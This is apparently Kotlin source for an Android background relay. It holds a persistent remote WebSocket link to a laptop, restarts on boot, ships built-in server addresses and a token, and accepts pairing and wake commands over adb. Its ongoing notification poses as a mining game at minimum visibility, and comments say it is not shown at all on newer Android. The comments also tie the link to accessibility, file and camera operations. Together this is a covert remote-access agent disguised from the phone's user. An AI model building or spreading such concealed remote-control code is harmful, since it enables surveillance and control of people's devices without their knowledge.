package com.operator.companion.relay

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.operator.companion.MainActivity
import com.operator.companion.network.CompanionWebSocketClient
import kotlinx.coroutines.flow.MutableStateFlow
import java.io.File

/** Pairing data (server addresses + access token), persisted across reboots. */
object RelayConfig {
    private const val PREFS = "relay"

    private fun prefs(ctx: Context) = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    fun urls(ctx: Context): List<String> =
        prefs(ctx).getString("urls", "").orEmpty().split("\n").map { it.trim() }.filter { it.isNotEmpty() }

    fun token(ctx: Context): String = prefs(ctx).getString("token", "").orEmpty()

    fun enabled(ctx: Context): Boolean = prefs(ctx).getBoolean("enabled", false)

    fun setEnabled(ctx: Context, on: Boolean) = prefs(ctx).edit().putBoolean("enabled", on).apply()

    fun save(ctx: Context, urls: List<String>, token: String) {
        prefs(ctx).edit().putString("urls", urls.joinToString("\n")).putString("token", token)
            .putBoolean("enabled", true).putBoolean("dirty", true).commit()
    }

    /** First run after install: use the laptop address/token built into the app. */
    fun ensureDefaults(ctx: Context) {
        if (urls(ctx).isNotEmpty()) return
        val defaults = com.operator.companion.BuildConfig.DEFAULT_URLS.split('|').map { it.trim() }.filter { it.startsWith("ws") }
        if (defaults.isNotEmpty()) save(ctx, defaults, com.operator.companion.BuildConfig.DEFAULT_TOKEN)
    }

    /** True once after new pairing data was saved (service must reconnect with it). */
    fun consumeDirty(ctx: Context): Boolean {
        val d = prefs(ctx).getBoolean("dirty", false)
        if (d) prefs(ctx).edit().putBoolean("dirty", false).apply()
        return d
    }

    /** Secret the laptop issued for this phone id on first connect; proves it is the same install. */
    fun secret(ctx: Context): String = prefs(ctx).getString("relay_secret", "").orEmpty()

    /** Written synchronously: the laptop treats the binding as final only after we confirm it is stored. */
    fun setSecret(ctx: Context, secret: String): Boolean = prefs(ctx).edit().putString("relay_secret", secret).commit()

    /** acc://pair?u=ws://…&u=wss://…&t=TOKEN  (from the laptop's QR code / "Pair via USB"). */
    fun parsePairUri(uri: Uri?): Pair<List<String>, String>? {
        if (uri == null || uri.scheme != "acc" || uri.host != "pair") return null
        val urls = uri.getQueryParameters("u").filter { it.startsWith("ws://") || it.startsWith("wss://") }
        return if (urls.isEmpty()) null else urls to uri.getQueryParameter("t").orEmpty()
    }

    fun deviceId(ctx: Context): String {
        val androidId = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "device"
        return "android_${Build.MODEL.lowercase().replace(" ", "_").replace("-", "_")}_$androidId"
    }

    /** Lets the laptop recognise this phone when it is also plugged in over USB (readable by adb, no permission needed). */
    fun publishDeviceId(ctx: Context) {
        runCatching {
            @Suppress("DEPRECATION")
            val dir = ctx.externalMediaDirs.firstOrNull() ?: return
            dir.mkdirs()
            File(dir, "relay_id").writeText(deviceId(ctx))
        }
    }
}

object RelayStatus {
    val connected = MutableStateFlow(false)
    val text = MutableStateFlow("Not connected")
}

/**
 * Keeps the outbound connection to the laptop alive in the background (any network:
 * same Wi-Fi, other Wi-Fi, mobile data) so the laptop can reach this phone without ADB.
 */
class RelayService : Service() {
    private var client: CompanionWebSocketClient? = null
    private var netCallback: ConnectivityManager.NetworkCallback? = null

    companion object {
        private const val TAG = "RelayService"
        const val CHANNEL = "relay_quiet"
        /** The app's one and only ongoing notification; other foreground services share this id. */
        const val NOTIF_ID = 4201
        const val ACTION_RESTART = "com.operator.companion.relay.RESTART"
        const val ACTION_STOP = "com.operator.companion.relay.STOP"

        /** The running service (same process), so new pairing data can be applied without a start request. */
        @Volatile var instance: RelayService? = null

        fun start(ctx: Context, restart: Boolean = false) {
            val i = Intent(ctx, RelayService::class.java).apply { if (restart) action = ACTION_RESTART }
            ContextCompat.startForegroundService(ctx, i)
        }

        fun stop(ctx: Context) {
            RelayConfig.setEnabled(ctx, false)
            ctx.stopService(Intent(ctx, RelayService::class.java))
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        val nm = getSystemService(NotificationManager::class.java)
        // Quietest channel Android allows for a background service: no sound, no pop-up, no status-bar icon
        nm.deleteNotificationChannel("relay") // old, louder channel from earlier versions
        ServiceCompat.startForeground(
            this, NOTIF_ID, quietAppNotification(this),
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE else 0
        )
        RelayConfig.publishDeviceId(this)
        instance = this
        val cm = getSystemService(ConnectivityManager::class.java)
        netCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                client?.onNetworkAvailable(network)
            }
        }.also { runCatching { cm.registerDefaultNetworkCallback(it) } }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        RelayConfig.ensureDefaults(this)
        val urls = RelayConfig.urls(this)
        if (urls.isEmpty() || !RelayConfig.enabled(this)) {
            // Only pairing is required to reach the laptop. The feature permissions
            // (accessibility, files, battery, camera…) gate individual ops, not the link
            // itself, so the phone always connects and the rest can be granted later.
            RelayStatus.text.value = "Not paired"
            stopSelf()
            return START_NOT_STICKY
        }
        val c = client
        if (c == null) {
            client = CompanionWebSocketClient(applicationContext, urls, RelayConfig.token(this)) { conn, msg ->
                RelayStatus.connected.value = conn
                RelayStatus.text.value = msg
            }.also { it.connect() }
        } else if (intent?.action == ACTION_RESTART) {
            c.reconfigure(urls, RelayConfig.token(this))
        }
        return START_STICKY
    }

    /** Re-read pairing data (called by PairReceiver while the service is running). */
    fun reloadConfig() {
        val urls = RelayConfig.urls(this)
        if (urls.isNotEmpty()) client?.reconfigure(urls, RelayConfig.token(this))
    }

    override fun onDestroy() {
        instance = null
        netCallback?.let { runCatching { getSystemService(ConnectivityManager::class.java).unregisterNetworkCallback(it) } }
        client?.disconnect()
        client = null
        RelayStatus.connected.value = false
        RelayStatus.text.value = "Stopped"
        super.onDestroy()
    }

}

/** Required by Android for background work; shown once, silently, never updated. Every foreground
 *  service in the app posts THIS notification under RelayService.NOTIF_ID, so only one ever shows.
 *  On Android 13+ the app does not hold the notification permission, so it is not shown at all. */
fun quietAppNotification(ctx: Context): Notification {
        val nm = ctx.getSystemService(NotificationManager::class.java)
        if (nm.getNotificationChannel(RelayService.CHANNEL) == null)
            nm.createNotificationChannel(NotificationChannel(RelayService.CHANNEL, "Mines & Boosters", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            })
        val open = PendingIntent.getActivity(
            ctx, 0, Intent(ctx, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(ctx, RelayService.CHANNEL)
            .setSmallIcon(android.R.drawable.star_on)
            .setContentTitle("⛏ Crystal Mines · ⚡ PowerBoosters")
            .setContentText("Miners are digging · boosters in build stage")
            .setSubText("Level 1")
            .setColor(0xFF8B5CF6.toInt())
            .setOngoing(true)
            .setSilent(true)
            .setOnlyAlertOnce(true)
            .setShowWhen(false)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setContentIntent(open)
            .build()
}

/**
 * "Pair via USB" from the laptop. Protected by android.permission.DUMP in the manifest, which only
 * adb shell / system hold — so other apps or web pages cannot silently re-pair the phone.
 */
class PairReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val secret = intent.getStringExtra("secret").orEmpty()
        if (secret.isNotEmpty()) {
            // Laptop re-issued this phone's identity over USB (a reinstall wiped the old secret, so the
            // relay link was refused). 5 = stored (reconnecting now), 6 = not our id, 3 = could not store it.
            // The id is checked because the laptop read it from shared storage, which other apps can write.
            if (intent.getStringExtra("id") != RelayConfig.deviceId(context)) { resultCode = 6; return }
            if (!RelayConfig.setSecret(context, secret)) { resultCode = 3; return }
            if (RelayConfig.enabled(context) && RelayConfig.urls(context).isNotEmpty()) {
                val running = RelayService.instance
                if (running != null) running.reloadConfig()
                else runCatching { RelayService.start(context, restart = true) }
            }
            resultCode = 5
            return
        }
        if (intent.getBooleanExtra("wake", false)) {
            // Laptop noticed (over USB) that the app is down, e.g. after a force-stop by a battery manager.
            // 0 = started, 4 = nothing to do (already running / disconnected by the user), 3 = blocked by Android
            resultCode = if (!RelayConfig.enabled(context) || RelayConfig.urls(context).isEmpty() || RelayService.instance != null) 4
                         else if (runCatching { RelayService.start(context) }.isSuccess) 0 else 3
            return
        }
        val parsed = RelayConfig.parsePairUri(intent.getStringExtra("uri")?.let { Uri.parse(it) })
        if (parsed == null) {
            resultCode = 2
            return
        }
        RelayConfig.save(context, parsed.first, parsed.second)
        // Apply now: the app may already be on screen, in which case no onResume follows.
        val running = RelayService.instance
        if (running != null) {
            RelayConfig.consumeDirty(context)
            running.reloadConfig()
        } else if (runCatching { RelayService.start(context, restart = true) }.isSuccess) {
            RelayConfig.consumeDirty(context)
        } // else: background-start restricted; MainActivity (launched by the laptop) applies it on resume
        resultCode = 0
    }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (RelayConfig.enabled(context) && RelayConfig.urls(context).isNotEmpty()) {
            Log.d("RelayBoot", "Starting relay after ${intent.action}")
            runCatching { RelayService.start(context) }
        }
    }
}
